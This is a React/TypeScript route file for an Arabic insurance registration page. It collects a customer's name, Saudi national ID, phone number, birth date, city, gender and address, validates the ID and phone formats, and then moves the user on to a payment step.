import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { ArrowLeft, Check, User, MapPin } from "lucide-react";
import { saudiCities } from "@/lib/insurance-data";
import { submitCurrentStep } from "@/lib/workflow";
import { track } from "@/lib/gate";

export const Route = createFileRoute("/reg")({
  head: () => ({
    meta: [
      { title: "بيانات العميل — بيكير" },
      { name: "description", content: "أدخل بياناتك الشخصية لإكمال طلب التأمين." },
      { property: "og:title", content: "بيانات العميل — بيكير" },
      { property: "og:description", content: "أدخل بياناتك الشخصية لإكمال طلب التأمين." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: RegisterPage,
});

const MONTHS = [
  { value: "1", label: "يناير" },
  { value: "2", label: "فبراير" },
  { value: "3", label: "مارس" },
  { value: "4", label: "أبريل" },
  { value: "5", label: "مايو" },
  { value: "6", label: "يونيو" },
  { value: "7", label: "يوليو" },
  { value: "8", label: "أغسطس" },
  { value: "9", label: "سبتمبر" },
  { value: "10", label: "أكتوبر" },
  { value: "11", label: "نوفمبر" },
  { value: "12", label: "ديسمبر" },
];

function daysInMonth(month: number, year: number) {
  return new Date(year, month, 0).getDate();
}

function RegisterPage() {
  const navigate = useNavigate();
  const [form, setForm] = useState({
    fullName: "",
    nationalId: "",
    phone: "",
    city: "",
    address: "",
    dob: "",
    gender: "male",
  });
  const [dobDay, setDobDay] = useState("");
  const [dobMonth, setDobMonth] = useState("");
  const [dobYear, setDobYear] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [fieldErrors, setFieldErrors] = useState<Record<string, string>>({});

  useEffect(() => {
    if (dobDay && dobMonth && dobYear) {
      const day = dobDay.padStart(2, "0");
      const month = dobMonth.padStart(2, "0");
      setForm((p) => ({ ...p, dob: `${dobYear}-${month}-${day}` }));
    } else {
      setForm((p) => ({ ...p, dob: "" }));
    }
  }, [dobDay, dobMonth, dobYear]);

  const update = (k: string, v: string) => {
    setForm((p) => ({ ...p, [k]: v }));
    setFieldErrors((p) => ({ ...p, [k]: "" }));
  };

  // Saudi national ID starts with 1, Iqama with 2 — always 10 digits.
  const validateNationalId = (v: string) =>
    /^[12]\d{9}$/.test(v) ? "" : "رقم الهوية/الإقامة يجب أن يكون 10 أرقام ويبدأ بـ 1 أو 2";
  // Saudi mobile: 05 followed by 8 digits.
  const validatePhone = (v: string) =>
    /^05\d{8}$/.test(v) ? "" : "رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    const errors: Record<string, string> = {
      nationalId: validateNationalId(form.nationalId),
      phone: validatePhone(form.phone),
    };
    setFieldErrors(errors);
    if (Object.values(errors).some(Boolean)) return;
    setLoading(true);
    track("submit", { step: "register" });
    const res = await submitCurrentStep("customer_info", form);
    if (!res.success) setError(res.error || "حدث خطأ");
    setLoading(false);
    if (res.success) void navigate({ to: "/payment" });
  };

  return (
    <div className="min-h-screen bg-dark-50 pt-16 md:pt-20">
      <div className="container-x py-8 md:py-12">
        <div className="mx-auto max-w-2xl">
          <div className="mb-6 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-primary-100 text-primary-600">
              <User className="h-8 w-8" />
            </div>
            <h1 className="mt-4 text-3xl font-extrabold text-dark-900">بيانات العميل</h1>
            <p className="mt-2 text-dark-500">أدخل بياناتك الشخصية لإكمال الطلب</p>
          </div>

          <div className="mb-6 flex justify-center gap-2">
            {[1, 2, 3].map((s) => (
              <div key={s} className="flex items-center gap-2">
                <div className={`flex h-9 w-9 items-center justify-center rounded-full text-sm font-bold ${s <= 2 ? "bg-primary-600 text-white" : "bg-dark-200 text-dark-500"}`}>
                  {s <= 2 ? <Check className="h-4 w-4" /> : s}
                </div>
                {s < 3 && <div className={`h-0.5 w-12 ${s < 2 ? "bg-primary-500" : "bg-dark-200"}`} />}
              </div>
            ))}
          </div>

          <form onSubmit={handleSubmit} className="card space-y-5">
            <div className="grid grid-cols-1 gap-5 md:grid-cols-2">
              <div className="md:col-span-2">
                <label className="mb-1.5 block text-sm font-medium text-dark-700">الاسم الكامل</label>
                <input value={form.fullName} onChange={(e) => update("fullName", e.target.value)} required className="input-field" placeholder="الاسم كما في الهوية" />
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-dark-700">الهوية الوطنية / الإقامة</label>
                <input value={form.nationalId} onChange={(e) => update("nationalId", e.target.value.replace(/\D/g, "").slice(0, 10))} onBlur={() => setFieldErrors((p) => ({ ...p, nationalId: form.nationalId ? validateNationalId(form.nationalId) : "" }))} required className="input-field" placeholder="1xxxxxxxxx" inputMode="numeric" maxLength={10} dir="ltr" />
                {fieldErrors["nationalId"] && <p className="mt-1 text-xs text-red-600">{fieldErrors["nationalId"]}</p>}
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-dark-700">رقم الجوال</label>
                <input value={form.phone} onChange={(e) => update("phone", e.target.value.replace(/\D/g, "").slice(0, 10))} onBlur={() => setFieldErrors((p) => ({ ...p, phone: form.phone ? validatePhone(form.phone) : "" }))} required className="input-field" placeholder="05xxxxxxxx" inputMode="numeric" maxLength={10} dir="ltr" />
                {fieldErrors["phone"] && <p className="mt-1 text-xs text-red-600">{fieldErrors["phone"]}</p>}
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-dark-700">تاريخ الميلاد</label>
                <div className="grid grid-cols-3 gap-2">
                  <select value={dobDay} onChange={(e) => setDobDay(e.target.value)} className="input-field">
                    <option value="">اليوم</option>
                    {Array.from({ length: dobYear && dobMonth ? daysInMonth(Number(dobMonth), Number(dobYear)) : 31 }, (_, i) => i + 1).map((d) => (
                      <option key={d} value={String(d)}>{d}</option>
                    ))}
                  </select>
                  <select value={dobMonth} onChange={(e) => setDobMonth(e.target.value)} className="input-field">
                    <option value="">الشهر</option>
                    {MONTHS.map((m) => <option key={m.value} value={m.value}>{m.label}</option>)}
                  </select>
                  <select value={dobYear} onChange={(e) => setDobYear(e.target.value)} className="input-field">
                    <option value="">السنة</option>
                    {Array.from({ length: 100 }, (_, i) => 2025 - 18 - i).map((y) => (
                      <option key={y} value={String(y)}>{y}</option>
                    ))}
                  </select>
                </div>
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-dark-700">المدينة</label>
                <select value={form.city} onChange={(e) => update("city", e.target.value)} required className="input-field">
                  <option value="">اختر المدينة</option>
                  {saudiCities.map((c) => <option key={c} value={c}>{c}</option>)}
                </select>
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-dark-700">الجنس</label>
                <select value={form.gender} onChange={(e) => update("gender", e.target.value)} className="input-field">
                  <option value="male">ذكر</option>
                  <option value="female">أنثى</option>
                </select>
              </div>
              <div className="md:col-span-2">
                <label className="mb-1.5 block text-sm font-medium text-dark-700">العنوان</label>
                <div className="relative">
                  <MapPin className="pointer-events-none absolute right-3 top-3 h-5 w-5 text-dark-400" />
                  <input value={form.address} onChange={(e) => update("address", e.target.value)} className="input-field !pr-10" placeholder="الحي، الشارع" />
                </div>
              </div>
            </div>

            {error && <p className="rounded-lg bg-red-50 px-4 py-2 text-sm text-red-600">{error}</p>}

            <button type="submit" disabled={loading} className="btn-primary w-full disabled:opacity-60">
              {loading ? "جارٍ الحفظ..." : "متابعة"}
              <ArrowLeft className="h-5 w-5" />
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
